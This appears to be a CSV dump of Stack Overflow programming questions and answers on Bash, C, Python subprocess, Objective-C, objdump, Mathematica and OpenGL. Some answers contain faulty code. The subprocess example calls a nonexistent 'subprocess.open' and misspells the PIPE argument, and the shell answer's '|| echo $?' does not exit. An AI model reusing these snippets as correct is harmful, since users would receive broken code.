QUESTION,USERID,USERNAME,ANSWER
"<p>If I have just entered the following command in Bash:</p>

<pre><code>echo foo
</code></pre>

<p>I can change foo to bar by typing:</p>

<pre><code>^foo^bar
</code></pre>

<p>Which results in the following command being executed:</p>

<pre><code>echo bar
</code></pre>

<p>Now if I enter:</p>

<pre><code>echo foo foo
</code></pre>

<p>Is there a way to change both instances of foo to bar just by using the caret (<code>^</code>) operator?</p>

<p>Additionally, are there man pages for shell operators like <code>^</code>? <code>man ^</code> results in ""No manual entry for ^"".</p>
","9530","","<p>That particular feature is called <em>quick substitution</em>; its documentation can be found in the <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Event-Designators"">Event Designators</a> section of the Bash Manual.  You can't do what you want with quick substitution; you'll have to resort to something slightly more verbose:</p>

<pre><code>!!:gs/foo/bar/
</code></pre>
"
"<p>I have an openGL window that is 640x480 that I need to center in the middle of the screen. I previously used:</p>

<pre><code>glutInitWindowPosition((GetSystemMetrics(SM_CXSCREEN)-640)/2,
                       (GetSystemMetrics(SM_CYSCREEN)-480)/2);
</code></pre>

<p>which WORKED. </p>

<p>But now all of a sudden when I compile...</p>

<pre><code>Linking...
1&gt;Project1.obj : error LNK2028: unresolved token (0A000372) ""extern ""C"" int __stdcall GetSystemMetrics(int)"" (?GetSystemMetrics@@$$J14YGHH@Z) referenced in function ""int __cdecl main(int,char * *)"" (?main@@$$HYAHHPAPAD@Z)
1&gt;Project1.obj : error LNK2019: unresolved external symbol ""extern ""C"" int __stdcall GetSystemMetrics(int)"" (?GetSystemMetrics@@$$J14YGHH@Z) referenced in function ""int __cdecl main(int,char * *)"" (?main@@$$HYAHHPAPAD@Z)
1&gt;C:\Users\My Computer\Documents\School Stuff\CS445\Project1\Debug\Project1.exe : fatal error LNK1120: 2 unresolved externals
</code></pre>

<p>Someone please help. This is very annoying and frustrating for me as I don't know a lot about OpenGL and GLUT.</p>
","9530","","<p>You need to make sure you're linking against User32.lib, the static library where <a href=""http://msdn.microsoft.com/en-us/library/ms724385%28VS.85%29.aspx"" rel=""nofollow""><code>GetSystemMetrics()</code></a> is defined.  Open up your project settings and make sure the User32.lib is listed among all of the .libs that you're linking against.</p>
"
"<p>Lets say I have the following scripts</p>

<p><strong>a.sh</strong> </p>

<pre><code>echo in a
if test 1 -ne 2; then
        echo oops
        exit 1
fi
</code></pre>

<p><strong>b.sh</strong></p>

<pre><code>echo in b
./a.sh
echo in b 2
</code></pre>

<p>When running b.sh, I want it to exit if a.sh exited.
How do I do this?</p>

<p>(The current output is</p>

<pre><code>in b
in a
oops
in b 2
</code></pre>

<p>And that's not what I want)</p>

<p>Thanks,
Rivka</p>
","9530","","<p>I don't think there's a way you can do it without explicitly checking the return status of the subshell, e.g.:</p>

<pre><code># This will run b.sh, and if that exits with a non-zero status, we will also
# exit with that same status; otherwise, we continue.
./b.sh || echo $?
</code></pre>
"
"<p>Hey, if you can get a more descriptive tittle please edit it.</p>

<p>I'm writing a little algorithm that involves checking values in a matrix.
Let's say:</p>

<pre><code>char matrix[100][100];
char *ptr = &amp;matrix[0][0];
</code></pre>

<p>imagine i populate the matrix with a couple of values (5 or 6) of 1, like:</p>

<pre><code>matrix[20][35]=1;
matrix[67][34]=1;
</code></pre>

<p>How can I know if the binary value of an interval of the matrix is zero, for example (in pseudo code)</p>

<pre><code>if((the value from ptr+100 to ptr+200)==0){ ... // do something
</code></pre>

<p>I'm trying to pick up on c/c++ again. There should be a way of picking those one hundred bytes (which are all next to each other) and check if their value is all zeros without having to check on by one.(considering char is one byte)</p>
","9530","","<p>There's no built-in language feature to do that, nor is there a standard library function to do it.  <a href=""http://linux.die.net/man/3/memcmp"" rel=""nofollow""><code>memcmp()</code></a> could work, but you'd need a second array of all zeroes to compare against; that array would have to be large, and you'd also eat up unnecessary memory bandwidth in doing the comparison.</p>

<p>Just write the function yourself, it's not that hard.  If this truly is the bottleneck of your application (which you should only conclude of <strong>profiling</strong>), then rewrite that function in assembly.</p>
"
"<blockquote>
  <p><strong>Possible Duplicates:</strong><br>
  <a href=""http://stackoverflow.com/questions/1388753/how-to-get-output-from-subprocess-popen"">How to get output from subprocess.Popen()</a><br>
  <a href=""http://stackoverflow.com/questions/1996518/retrieving-the-output-of-subprocess-call"">Retrieving the output of subprocess.call()</a>  </p>
</blockquote>



<p>Here is my question. I have an executable called device_console. The device_console provides a command line interface to a device. In device_console, four commands can be run: status, list, clear and exit. Each command produces an output. As an example:</p>

<pre><code>[asdfgf@localhost ~]$ device_console

device_console&gt; list

File A

File B

device_console&gt; status
Status: OK

device_console&gt; clear
All files cleared

device_console&gt; list
device_console&gt; exit

[asdfgf@localhost ~]$
</code></pre>

<p>As part of testing, I want to get the output of each command. I want to use Python for it. I am looking at Python's subprocess, but somehow I am unable to put them together. Can you please help?</p>
","9530","","<p>Use the <a href=""http://docs.python.org/library/subprocess.html"" rel=""nofollow""><code>subprocess</code> module</a>.  Example:</p>

<pre><code>import subprocess

# Open the subprocess
proc = subprocess.open('device_console', stdin=subprocess.PIPE, stdout.subprocess.PIPE)

# Write a command
proc.stdin.write('list\n')

# Read the results back -- this will block until a line of input is received
listing = proc.stdout.readline()

# When you're done, close the input stream so the subprocess knows to exit
proc.stdin.close()

# Wait for subprocess to exit (optional) and get its exit status
exit_status = proc.wait()
</code></pre>
"
"<p>I found this in initramfs.c, I haven't seen this syntax before, could some one explain what it is doing?</p>

<pre><code>static __initdata int (*actions[])(void) = {
  [Start]   = do_start,
  [Collect] = do_collect,
  [GotHeader] = do_header,
  [SkipIt]  = do_skip,
  [GotName] = do_name,
  [CopyFile]  = do_copy,
  [GotSymlink]  = do_symlink,
  [Reset]   = do_reset,
};
</code></pre>

<p>Source Code (line 366): <a href=""http://www.gelato.unsw.edu.au/lxr/source/init/initramfs.c"">initramfs.c</a> </p>
","9530","","<p>This is a feature from ISO C99 known as <a href=""http://gcc.gnu.org/onlinedocs/gcc/Designated-Inits.html"">designated initializers</a>.  It creates an array and initializes specific elements of that array, not necessarily the first N in order.  It's equivalent to the following snippet:</p>

<pre><code>static __initdata int (*actions[SOME_SIZE])(void);
actions[Start]   = do_start;
actions[Collect] = do_collect;
actions[GotHeader] = do_header;
actions[SkipIt]  = do_skip;
actions[GotName] = do_name;
actions[CopyFile]  = do_copy;
actions[GotSymlink]  = do_symlink;
actions[Reset]   = do_reset;
</code></pre>

<p>Except that the array will only be as large as it needs to (equal in size to one more than the largest index), and it can be initialized statically at global scope -- you can't run the above code at global scope.</p>

<p>This is not a feature of ANSI C89, but GCC provides this feature as an extension even when compiling code as C89.</p>
"
"<p>I want to embed a file in a program. It will be used for default configuration files if none are provided. I have realized I could just use default values, but I want to extract the file and place it on the disk so it can be modified.</p>
","9530","","<p>One common thing you can do is to represent the file data as an array of static bytes:</p>

<pre><code>// In a header file:
extern const char file_data[];
extern const size_t file_data_size;

// In a source file:
const char file_data[] = {0x41, 0x42, ... };  // etc.
const size_t file_data_size = sizeof(file_data);
</code></pre>

<p>Then the file data will just be a global array of bytes compiled into your executable that you can reference anywhere.  You'll have to either rewrite your file processing code to be able to handle a raw byte array, or use something like <a href=""http://linux.die.net/man/3/fmemopen"" rel=""nofollow""><code>fmemopen(3)</code></a> to open a pseudo-file handle from the data and pass that on to your file handling code.</p>

<p>Of course, to get the data into this form, you'll need to use some sort of preprocessing step to convert the file into a byte array that the compiler can accept.  A makefile would be good for this.</p>
"
"<p>Anyone can tell me that how can I get the total life age (usage time), Modal Number, software version of the iPhone using obj c.
Also how can we check that iphone is jailbroken or not using objective C.</p>

<p>Thanks
MAS</p>
","9530","","<p>I don't know about the usage time, but you can get the device type and OS version from the <a href=""http://developer.apple.com/iphone/library/documentation/uikit/reference/UIDevice_Class/Reference/UIDevice.html"" rel=""nofollow"">UIDevice class</a>:</p>

<pre><code>NSLog(@""Device type: %@\niOS version: %@\n"",
    [UIDevice currentDevice].model,
    [UIDevice currentDevice].systemVersion);
// Might output this:
Device type: iPhone
iOS version: 2.0
</code></pre>
"
"<p>If you have an object file, how do you get the initialized value of a global variable in that object file's data segment?  For example, say I've done the following:</p>

<pre><code># I'm interested in the variable foo inside bar.o in libbar.a:
$ ar -x libbar.a bar.o
$ nm --print-size bar.o | grep foo
00000048 00000004 D foo
</code></pre>

<p>This tells me that <code>foo</code> is at offset 0x48 in the data segment with size 4, but how do I obtain the actual initialized value it obtains upon load?</p>
","9530","","<p>Figured it out:</p>

<pre><code>objdump -j.data -s bar.o
</code></pre>

<p>This gives a hexdump of the data segment, making it easy to look up values.  I've used <code>objdump -d</code> before to disassemble code, but the <code>-s</code> option is new to me.</p>
"
"<p>In Mathematica,</p>

<ol>
<li>How can I create a list of length n
and fill with zeroes?</li>
<li>How can I
create a vector of length n and fill
with zeroes?</li>
</ol>
","9530","","<p>In Mathematica, there's no distinction between lists and vectors.  You can use the <a href=""http://reference.wolfram.com/mathematica/ref/Table.html"" rel=""nofollow""><code>Table</code></a> function to generate a list of length n:</p>

<pre><code>x = Table[0, {n}]
(* If n was 4, x would now be the list {0, 0, 0, 0} *)
</code></pre>
"
"<p>What's the bare skeleton to get a triangle drawn on an OpenGL window in C on OSX? I've gone through the tutorials at Nehe and tried to get it working, but the CreateGLWindow seems hopelessly tied to win32.</p>

<p>I want to stick to just opengl and glut, etc. I'll be eventually wrapping this in scheme, but I'd like to have a firmer understanding at the c-level beforehand.</p>

<p>Here's what I have thus far:</p>

<pre><code>#include &lt;OpenGL/gl.h&gt;// Header File For The OpenGL32 Library
#include &lt;OpenGL/glu.h&gt;// Header File For The GLu32 Library
#include &lt;GLUT/glut.h&gt;// Header File For The GLut Library

#define kWindowWidth 400;
#define kWindowHeight 300;

HGLRC hRC=NULL;// Permanent Rendering Context
HDC             hDC=NULL;// Private GDI Device Context
HWND            hWnd=NULL;// Holds Our Window Handle
HINSTANCE       hInstance;// Holds The Instance Of The Application

LRESULTCALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);// Declaration For WndProc

boolkeys[256];// Array Used For The Keyboard Routine
boolactive=TRUE;// Window Active Flag Set To TRUE By Default
boolfullscreen=TRUE;// Fullscreen Flag Set To Fullscreen Mode By Default

GLvoid ReSizeGLScene(GLsizei width, GLsizei height)// Resize And Initialize The GL Window
{
  if (height==0)// Prevent A Divide By Zero By
    {
      height=1;// Making Height Equal One
    }

  glViewport(0, 0, width, height);// Reset The Current Viewport
  glMatrixMode(GL_PROJECTION);// Select The Projection Matrix
  glLoadIdentity();// Reset The Projection Matrix

  // Calculate The Aspect Ratio Of The Window
  gluPerspective(45.0f,(GLfloat)width/(GLfloat)height,0.1f,100.0f);

  glMatrixMode(GL_MODELVIEW);// Select The Modelview Matrix
  glLoadIdentity();// Reset The Modelview Matrix
}

int InitGL(GLvoid)// All Setup For OpenGL Goes Here
{
  glShadeModel(GL_SMOOTH);// Enables Smooth Shading
  glClearColor(0.0f, 0.0f, 0.0f, 0.0f);// Black Background
  glClearDepth(1.0f);// Depth Buffer Setup
  glEnable(GL_DEPTH_TEST);// Enables Depth Testing
  glDepthFunc(GL_LEQUAL);// The Type Of Depth Test To Do
  glHint(GL_PERSPECTIVE_CORRECTION_HINT, GL_NICEST);// Really Nice Perspective Calculations

  return TRUE;// Initialization Went OK
}

int DrawGLScene(GLvoid)// Here's Where We Do All The Drawing
{
  glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);// Clear The Screen And The Depth Buffer
  glLoadIdentity();// Reset The Current Modelview Matrix
  return TRUE;// Everything Went OK
}

GLvoid KillGLWindow(GLvoid)// Properly Kill The Window
{
  if (fullscreen)// Are We In Fullscreen Mode?
    {
      ChangeDisplaySettings(NULL,0);// If So Switch Back To The Desktop
      ShowCursor(TRUE);// Show Mouse Pointer
    }

  if (hRC)// Do We Have A Rendering Context?
    {
      if (!wglMakeCurrent(NULL,NULL))// Are We Able To Release The DC And RC Contexts?
        {
          MessageBox(NULL,""Release Of DC And RC Failed."",""SHUTDOWN ERROR"",MB_OK | MB_ICONINFORMATION);
        }
      if (!wglDeleteContext(hRC))// Are We Able To Delete The RC?
        {
          MessageBox(NULL,""Release Rendering Context Failed."",""SHUTDOWN ERROR"",MB_OK | MB_ICONINFORMATION);
        }
      hRC=NULL;// Set RC To NULL
    }
  if (hDC &amp;&amp; !ReleaseDC(hWnd,hDC))// Are We Able To Release The DC
    {
      MessageBox(NULL,""Release Device Context Failed."",""SHUTDOWN ERROR"",MB_OK | MB_ICONINFORMATION);
      hDC=NULL;// Set DC To NULL
    }

  if (hWnd &amp;&amp; !DestroyWindow(hWnd))// Are We Able To Destroy The Window?
    {
      MessageBox(NULL,""Could Not Release hWnd."",""SHUTDOWN ERROR"",MB_OK | MB_ICONINFORMATION);
      hWnd=NULL;// Set hWnd To NULL
    }

  if (!UnregisterClass(""OpenGL"",hInstance))// Are We Able To Unregister Class
    {
      MessageBox(NULL,""Could Not Unregister Class."",""SHUTDOWN ERROR"",MB_OK | MB_ICONINFORMATION);
      hInstance=NULL;// Set hInstance To NULL
    }
}

BOOL CreateGLWindow(char* title, int width, int height, int bits, bool fullscreenflag)
{
  GLuintPixelFormat;// Holds The Results After Searching For A Match
  WNDCLASSwc;// Windows Class Structure

  DWORDdwExStyle;// Window Extended Style
  DWORDdwStyle;// Window Style

  RECT WindowRect;// Grabs Rectangle Upper Left / Lower Right Values
  WindowRect.left=(long)0;// Set Left Value To 0
  WindowRect.right=(long)width;// Set Right Value To Requested Width
  WindowRect.top=(long)0;// Set Top Value To 0
  WindowRect.bottom=(long)height;// Set Bottom Value To Requested Height

  fullscreen=fullscreenflag;// Set The Global Fullscreen Flag

  hInstance= GetModuleHandle(NULL);// Grab An Instance For Our Window
  wc.style= CS_HREDRAW | CS_VREDRAW | CS_OWNDC;// Redraw On Move, And Own DC For Window
  wc.lpfnWndProc= (WNDPROC) WndProc;// WndProc Handles Messages
  wc.cbClsExtra= 0;// No Extra Window Data
  wc.cbWndExtra= 0;// No Extra Window Data
  wc.hInstance= hInstance;// Set The Instance
  wc.hIcon= LoadIcon(NULL, IDI_WINLOGO);// Load The Default Icon
  wc.hCursor= LoadCursor(NULL, IDC_ARROW);// Load The Arrow Pointer
  wc.hbrBackground= NULL;// No Background Required For GL
  wc.lpszMenuName= NULL;// We Don't Want A Menu
  wc.lpszClassName= ""OpenGL"";// Set The Class Name

  if (!RegisterClass(&amp;wc))// Attempt To Register The Window Class
    {
      MessageBox(NULL,""Failed To Register The Window Class."",""ERROR"",MB_OK|MB_ICONEXCLAMATION);
      return FALSE;// Exit And Return FALSE
    }

  if (fullscreen)// Attempt Fullscreen Mode?
    {
      DEVMODE dmScreenSettings;// Device Mode
      memset(&amp;dmScreenSettings,0,sizeof(dmScreenSettings));// Makes Sure Memory's Cleared
      dmScreenSettings.dmSize=sizeof(dmScreenSettings);// Size Of The Devmode Structure
      dmScreenSettings.dmPelsWidth= width;// Selected Screen Width
      dmScreenSettings.dmPelsHeight= height;// Selected Screen Height
      dmScreenSettings.dmBitsPerPel= bits;// Selected Bits Per Pixel
      dmScreenSettings.dmFields=DM_BITSPERPEL|DM_PELSWIDTH|DM_PELSHEIGHT;

      // Try To Set Selected Mode And Get Results.  NOTE: CDS_FULLSCREEN Gets Rid Of Start Bar.
      if (ChangeDisplaySettings(&amp;dmScreenSettings,CDS_FULLSCREEN)!=DISP_CHANGE_SUCCESSFUL)
        {
          // If The Mode Fails, Offer Two Options.  Quit Or Run In A Window.
          if (MessageBox(NULL,""The Requested Fullscreen Mode Is Not Supported By\nYour Video Card. Use Windowed Mode Instead?"",""NeHe GL"",MB_YESNO|MB_ICONEXCLAMATION)==IDYES)
            {
              fullscreen=FALSE;// Select Windowed Mode (Fullscreen=FALSE)
            }
          else
            {
              // Pop Up A Message Box Letting User Know The Program Is Closing.
              MessageBox(NULL,""Program Will Now Close."",""ERROR"",MB_OK|MB_ICONSTOP);
              return FALSE;// Exit And Return FALSE
            }
        }
    }

  if (fullscreen)// Are We Still In Fullscreen Mode?
    {
      dwExStyle=WS_EX_APPWINDOW;// Window Extended Style
      dwStyle=WS_POPUP;// Windows Style
      ShowCursor(FALSE);// Hide Mouse Pointer
    }
  else
    {
      dwExStyle=WS_EX_APPWINDOW | WS_EX_WINDOWEDGE;// Window Extended Style
      dwStyle=WS_OVERLAPPEDWINDOW;// Windows Style
    }

  AdjustWindowRectEx(&amp;WindowRect, dwStyle, FALSE, dwExStyle);// Adjust Window To True Requested Size

  if (!(hWnd=CreateWindowEx(dwExStyle,// Extended Style For The Window
                            ""OpenGL"",// Class Name
                            title,// Window Title
                            WS_CLIPSIBLINGS |// Required Window Style
                            WS_CLIPCHILDREN |// Required Window Style
                            dwStyle,// Selected Window Style
                            0, 0,// Window Position
                            WindowRect.right-WindowRect.left,// Calculate Adjusted Window Width
                            WindowRect.bottom-WindowRect.top,// Calculate Adjusted Window Height
                            NULL,// No Parent Window
                            NULL,// No Menu
                            hInstance,// Instance
                            NULL)))// Don't Pass Anything To WM_CREATE
    {
      KillGLWindow();// Reset The Display
      MessageBox(NULL,""Window Creation Error."",""ERROR"",MB_OK|MB_ICONEXCLAMATION);
      return FALSE;// Return FALSE
    }

  staticPIXELFORMATDESCRIPTOR pfd=// pfd Tells Windows How We Want Things To Be
    {
      sizeof(PIXELFORMATDESCRIPTOR),// Size Of This Pixel Format Descriptor
      1,// Version Number
      PFD_DRAW_TO_WINDOW |// Format Must Support Window
      PFD_SUPPORT_OPENGL |// Format Must Support OpenGL
      PFD_DOUBLEBUFFER,// Must Support Double Buffering
      PFD_TYPE_RGBA,// Request An RGBA Format
      bits,// Select Our Color Depth
      0, 0, 0, 0, 0, 0,// Color Bits Ignored
      0,// No Alpha Buffer
      0,// Shift Bit Ignored
      0,// No Accumulation Buffer
      0, 0, 0, 0,// Accumulation Bits Ignored
      16,// 16Bit Z-Buffer (Depth Buffer)
      0,// No Stencil Buffer
      0,// No Auxiliary Buffer
      PFD_MAIN_PLANE,// Main Drawing Layer
      0,// Reserved
      0, 0, 0// Layer Masks Ignored
    };

  if (!(hDC=GetDC(hWnd)))// Did We Get A Device Context?
    {
      KillGLWindow();// Reset The Display
      MessageBox(NULL,""Can't Create A GL Device Context."",""ERROR"",MB_OK|MB_ICONEXCLAMATION);
      return FALSE;// Return FALSE
    }

  if (!(PixelFormat=ChoosePixelFormat(hDC,&amp;pfd)))// Did Windows Find A Matching Pixel Format?
    {
      KillGLWindow();// Reset The Display
      MessageBox(NULL,""Can't Find A Suitable PixelFormat."",""ERROR"",MB_OK|MB_ICONEXCLAMATION);
      return FALSE;// Return FALSE
    }

  if(!SetPixelFormat(hDC,PixelFormat,&amp;pfd))// Are We Able To Set The Pixel Format?
    {
      KillGLWindow();// Reset The Display
      MessageBox(NULL,""Can't Set The PixelFormat."",""ERROR"",MB_OK|MB_ICONEXCLAMATION);
      return FALSE;// Return FALSE
    }

  if (!(hRC=wglCreateContext(hDC)))// Are We Able To Get A Rendering Context?
    {
      KillGLWindow();// Reset The Display
      MessageBox(NULL,""Can't Create A GL Rendering Context."",""ERROR"",MB_OK|MB_ICONEXCLAMATION);
      return FALSE;// Return FALSE
    }

  if(!wglMakeCurrent(hDC,hRC))// Try To Activate The Rendering Context
    {
      KillGLWindow();// Reset The Display
      MessageBox(NULL,""Can't Activate The GL Rendering Context."",""ERROR"",MB_OK|MB_ICONEXCLAMATION);
      return FALSE;// Return FALSE
    }

  ShowWindow(hWnd,SW_SHOW);// Show The Window
  SetForegroundWindow(hWnd);// Slightly Higher Priority
  SetFocus(hWnd);// Sets Keyboard Focus To The Window
  ReSizeGLScene(width, height);// Set Up Our Perspective GL Screen

  if (!InitGL())// Initialize Our Newly Created GL Window
    {
      KillGLWindow();// Reset The Display
      MessageBox(NULL,""Initialization Failed."",""ERROR"",MB_OK|MB_ICONEXCLAMATION);
      return FALSE;// Return FALSE
    }
  return TRUE;// Success
}

LRESULT CALLBACK WndProc(HWNDhWnd,// Handle For This Window
                         UINTuMsg,// Message For This Window
                         WPARAMwParam,// Additional Message Information
                         LPARAMlParam)// Additional Message Information
{
  switch (uMsg)// Check For Windows Messages
    {
    case WM_ACTIVATE:// Watch For Window Activate Message
      {
        if (!HIWORD(wParam))// Check Minimization State
          {
            active=TRUE;// Program Is Active
          }
        else
          {
            active=FALSE;// Program Is No Longer Active
          }

        return 0;// Return To The Message Loop
      }
    case WM_SYSCOMMAND:// Intercept System Commands
      {
        switch (wParam)// Check System Calls
          {
          case SC_SCREENSAVE:// Screensaver Trying To Start?
          case SC_MONITORPOWER:// Monitor Trying To Enter Powersave?
            return 0;// Prevent From Happening
          }
        break;// Exit
      }
    case WM_CLOSE:// Did We Receive A Close Message?
      {
        PostQuitMessage(0);// Send A Quit Message
        return 0;// Jump Back
      }
    case WM_KEYDOWN:// Is A Key Being Held Down?
      {
        keys[wParam] = TRUE;// If So, Mark It As TRUE
        return 0;// Jump Back
      }
    case WM_KEYUP:// Has A Key Been Released?
      {
        keys[wParam] = FALSE;// If So, Mark It As FALSE
        return 0;// Jump Back
      }
    case WM_SIZE:// Resize The OpenGL Window
      {
        ReSizeGLScene(LOWORD(lParam),HIWORD(lParam));// LoWord=Width, HiWord=Height
        return 0;// Jump Back
      }
    }
  // Pass All Unhandled Messages To DefWindowProc
  return DefWindowProc(hWnd,uMsg,wParam,lParam);
}

GLvoid InitGL(GLvoid);
GLvoid DrawGLScene(GLvoid);
GLvoid ReSizeGLScene(int Width, int Height);

int main(int argc, char** argv)
{
  glutInit(&amp;argc, argv);
  glutInitDisplayMode (GLUT_DOUBLE | GLUT_RGB | GLUT_DEPTH);
  glutInitWindowSize (kWindowWidth, kWindowHeight);
  glutInitWindowPosition (100, 100);
  glutCreateWindow (argv[0]);

  InitGL();

  glutDisplayFunc(DrawGLScene);
  glutReshapeFunc(ReSizeGLScene);

  glutMainLoop();

  return 0;
}
</code></pre>
","9530","","<p>NeHe has a tutorial for setting up an OpenGL window on Mac OS X with GLUT <a href=""http://nehe.gamedev.net/data/lessons/lesson.asp?lesson=Mac_OS_X"" rel=""nofollow"">here</a>.  They also provide the code for all of the lessons for various different platforms.  If you scroll to the bottom of <a href=""http://nehe.gamedev.net/data/lessons/lesson.asp?lesson=02"" rel=""nofollow"">lesson 2</a>, you can download the lesson code ready to go for a number of platforms.  You probably want either the GLUT sample or the Mac OS X/Cocoa sample.</p>
"
